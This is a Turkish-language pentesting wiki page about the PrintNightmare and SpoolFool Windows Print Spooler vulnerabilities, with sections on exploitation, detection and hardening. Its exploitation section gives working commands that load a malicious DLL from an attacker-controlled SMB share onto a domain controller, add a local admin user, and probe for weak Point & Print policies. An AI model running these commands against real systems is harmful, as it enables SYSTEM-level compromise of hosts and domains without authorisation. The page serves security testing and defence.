# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare, Windows **Print Spooler** hizmetindeki bir grup zafiyete verilen ortak addır. Bu zafiyetler **SYSTEM olarak arbitrary code execution** ve spooler RPC üzerinden erişilebilir olduğunda etki alanı denetleyicileri ile dosya sunucularında **remote code execution (RCE)** sağlar. En çok istismar edilen CVE'ler **CVE-2021-1675** (başlangıçta LPE olarak sınıflandırıldı) ve **CVE-2021-34527**'dir (tam RCE). **CVE-2021-34481 (“Point & Print”)** ve **CVE-2022-21999 (“SpoolFool”)** gibi sonraki sorunlar, attack surface'in hâlâ tamamen kapatılmaktan çok uzak olduğunu göstermektedir.

**Driver-based RCE/LPE** yerine spooler üzerinden **authentication coercion / relay** arıyorsanız, [printer coercion abuse hakkındaki diğer sayfaya](printers-spooler-service-abuse.md) bakın. Bu sayfa **driver'ların / DLL'lerin SYSTEM olarak yüklenmesine** odaklanmaktadır.

---

## 1. Vulnerable components & CVEs

| Year | CVE | Short name | Primitive | Notes |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Haziran 2021 CU'da patch'lendi ancak CVE-2021-34527 ile bypass edildi|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx`, authenticated user'ların remote share üzerinden bir driver DLL yüklemesine izin verir; Ağustos 2021 sonrasında bu işlem genellikle zayıflatılmış Point & Print policy'leri gerektirir|
|2021|CVE-2021-34481|“Point & Print”|LPE|Non-admin user'lar tarafından unsigned driver installation|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Arbitrary directory creation → DLL planting – 2021 patch'lerinden sonra çalışır|

Bunların tümü **MS-RPRN / MS-PAR RPC methods** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) veya **Point & Print** içindeki trust relationship'lerden birini abuse eder.

## 2. Exploitation techniques

### 2.1 Remote Domain Controller compromise (CVE-2021-34527)

Authenticated ancak **non-privileged** bir domain user, aşağıdaki yöntemle remote spooler üzerinde (çoğunlukla DC) **NT AUTHORITY\SYSTEM** olarak arbitrary DLL'ler çalıştırabilir:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
Yaygın PoC'ler arasında **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) ve Benjamin Delpy'nin **mimikatz** içindeki `misc::printnightmare / lsa::addsid` modülleri bulunur.

### 2.2 Yerel privilege escalation (desteklenen tüm Windows sürümleri, 2021-2024)

Aynı API, `C:\Windows\System32\spool\drivers\x64\3\` konumundan bir driver yüklemek ve SYSTEM privileges elde etmek için **yerel olarak** çağrılabilir:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 Yamalı hostlarda modern triage

Tamamen güncel bir host üzerinde public PrintNightmare PoC'leri genellikle başarısız olur; çünkü Windows artık varsayılan olarak **yalnızca administrator'lar tarafından** yazıcı driver'ı yüklenmesine izin verir (`RestrictDriverInstallationToAdministrators=1`, 10 Ağustos 2021'den beri). Bir hedefe exploit uygulamadan önce, ortamın legacy yazıcı dağıtımları için bu güvenlik değişikliğini geri alıp almadığını kontrol edin:<sup>[[3]](#references)</sup>
```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```
En ilgi çekici zayıf değerler genellikle şunlardır:<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Bir PoC çalıştırmadan önce hedefin ilgili print RPC interfaces öğelerini açığa çıkardığını Linux üzerinden hızlıca doğrulayın:
```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```
Bazı daha yeni public araçlar, DLL göndermeden önce daha güvenli bir **check/list** iş akışı da sunar:
```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```
> Düşük ayrıcalıklı bir kullanıcı olarak `RPC_E_ACCESS_DENIED` (`0x8001011b`) alıyorsanız, genellikle bir transport failure yerine 2021 sonrası varsayılan davranışı görüyorsunuzdur.

> Windows 11 22H2+ ve daha yeni client build'lerinde remote printing varsayılan olarak **RPC over TCP** kullanır ve **RPC over named pipes** (`\PIPE\spoolss`), açıkça yeniden etkinleştirilmediği sürece devre dışıdır. Bazı eski PoC'ler ve lab notları hâlâ named pipe'a erişilebildiğini varsayar.<sup>[[4]](#references)</sup>

### 2.4 “patched” network'lerde Package Point & Print abuse

Birçok enterprise environment, ilk 2021 patch'lerinden sonra da policy nedeniyle **vulnerable** kalmıştır; çünkü helpdesk veya print-server workflow'ları hâlâ non-admin kullanıcıların driver yüklemesini/güncellemesini gerektiriyordu. Pratikte offensive playbook şu hâle gelir:

- Security prompt'lar tamamen devre dışıysa, **classic arbitrary-DLL PrintNightmare** hâlâ en kısa yoldur.
- `Only use Package Point and Print` etkinse genellikle raw DLL drop yerine **signed package-aware driver** yoluna pivot etmeniz gerekir.<sup>[[3]](#references)</sup>
- 2024 research, **`Package Point and Print - Approved servers` seçeneğinin tek başına hard trust boundary olmadığını** gösterdi: Bir attacker, approved print server'lardan biri için name resolution'ı spoof edebilir veya hijack edebilirse victim'lar hâlâ policy check'lerini karşılayan malicious server'a yönlendirilebilir.<sup>[[4]](#references)</sup>
- UNC hardening ile forced RPC-over-SMB birlikte kullanılsa bile bu yaklaşım kırılgan olabilir; çünkü modern client'lar **RPC over TCP'ye fallback** yapabilir.<sup>[[4]](#references)</sup>

Modern PrintNightmare-style exploitation'ın, orijinal 2021 PoC'yi değiştirmeden yeniden oynatmaktan çok **enterprise printer deployment policy'yi abuse etmeye** odaklanmasının nedeni budur.

### 2.5 SpoolFool (CVE-2022-21999) – 2021 düzeltmelerini aşma

Microsoft'un 2021 patch'leri remote driver loading'i engelledi, ancak **directory permission'larını harden etmedi**. SpoolFool, `SpoolDirectory` parametresini abuse ederek `C:\Windows\System32\spool\drivers\` altında arbitrary bir directory oluşturur, bir payload DLL bırakır ve spooler'ı bunu load etmeye zorlar:<sup>[[2]](#references)</sup>
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> Exploit, Şubat 2022 güncellemelerinden önce tamamen yamalanmış Windows 7 → Windows 11 ve Server 2012R2 → 2022 sürümlerinde çalışır<sup>[[2]](#references)</sup>

---

## 3. Tespit ve hunting

* **PrintService logları** – *Microsoft-Windows-PrintService/Operational* kanalını etkinleştirin ve başarılı ve başarısız denemelerde **Event ID 316** (driver eklendi/güncellendi; genellikle DLL adlarını içerir) olaylarını izleyin. Şüpheli spooler modülü/driver yükleme hataları için bunu **Event ID 808/811** ile eşleştirin.
* **Sysmon** – Üst süreç **spoolsv.exe** olduğunda `C:\Windows\System32\spool\drivers\*` içinde gerçekleşen `Event ID 7` (Image loaded) veya `11/23` (File write/delete) olayları.
* **Process lineage** – **spoolsv.exe** tarafından `cmd.exe`, `rundll32.exe`, PowerShell veya beklenmeyen herhangi bir imzasız alt süreç başlatıldığında uyarı oluşturun.
* **Network telemetry** – **spoolsv.exe** tarafından saldırganın kontrolündeki paylaşımlardan beklenmeyen SMB çekimleri veya print server olarak çalışmaması gereken sunuculardan gelen olağandışı printer RPC trafiği, yüksek sinyalli ipuçlarıdır.

## 4. Mitigation ve hardening

1. **Patch uygulayın!** – Print Spooler service yüklü olan tüm Windows hostlarına en son cumulative update'i uygulayın.
2. **Gerekli olmayan yerlerde spooler'ı devre dışı bırakın**, özellikle Domain Controller'larda:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Yerel printing'e izin verirken remote bağlantıları engelleyin** – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Point & Print'i yalnızca admin'lere açık tutmak** için şunu ayarlayın:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Ayrıntılı yönlendirme Microsoft KB5005652'de<sup>[[1]](#references)</sup>
5. İş gereksinimleri `RestrictDriverInstallationToAdministrators=0` kullanılmasını zorunlu kılıyorsa, diğer tüm printer policy'lerini yalnızca **kısmi mitigation** olarak değerlendirin. En azından **package-aware drivers** kullanmayı tercih edin, **Only use Package Point and Print** seçeneğini etkinleştirin ve **Package Point and Print - Approved servers** listesini açıkça belirtilen forest içi print server'larla sınırlandırın.<sup>[[3]](#references)</sup>
6. Bozuk printer mapping'lerini düzeltmek için printer RPC privacy ayarını **rollback etmeyin**. `RpcAuthnLevelPrivacyEnabled=0` ayarını kullanan ortamlar, **CVE-2021-1678** için eklenen hardening'i geri alır ve genellikle bir engagement sırasında daha ayrıntılı incelemeyi hak eder.<sup>[[4]](#references)</sup>

---

## 5. İlgili araştırmalar / tools

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) modülleri
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – `-check`, `-list` ve `-delete` modlarına sahip standart Impacket implementation'ı
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – yerleşik SMB delivery, multi-target desteği ve hem `MS-RPRN` hem de `MS-PAR` modlarına sahip wrapper
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – package Point & Print üzerinden bring-your-own-vulnerable-printer-driver abuse
* SpoolFool exploit ve write-up
* SpoolFool ve diğer spooler bug'ları için 0patch micropatch'leri

Driver yüklemek yerine spooler üzerinden **kimlik doğrulamayı zorlamak** istiyorsanız [printer spooler service abuse](printers-spooler-service-abuse.md) sayfasına geçin.

---

## Kaynaklar

- [1] [Microsoft – KB5005652: Manage new Point & Print default driver installation behavior](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – A Practical Guide to PrintNightmare in 2024](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – The PrintNightmare is not Over Yet](https://itm4n.github.io/printnightmare-not-over/)

{{#include ../../banners/hacktricks-training.md}}
